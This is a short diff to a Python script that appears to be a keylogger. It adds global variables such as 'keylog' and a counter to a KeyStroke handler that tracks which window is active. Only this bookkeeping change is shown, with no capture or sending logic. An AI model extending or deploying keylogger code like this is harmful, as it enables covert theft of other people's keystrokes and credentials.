@@ -40,6 +40,9 @@ def get_current_process():
 
 def KeyStroke(event):
   global current_window
+  global keylog
+  global count
+  global exit_count 
 
   if event.WindowName != current_window:
     current_window = event.WindowName
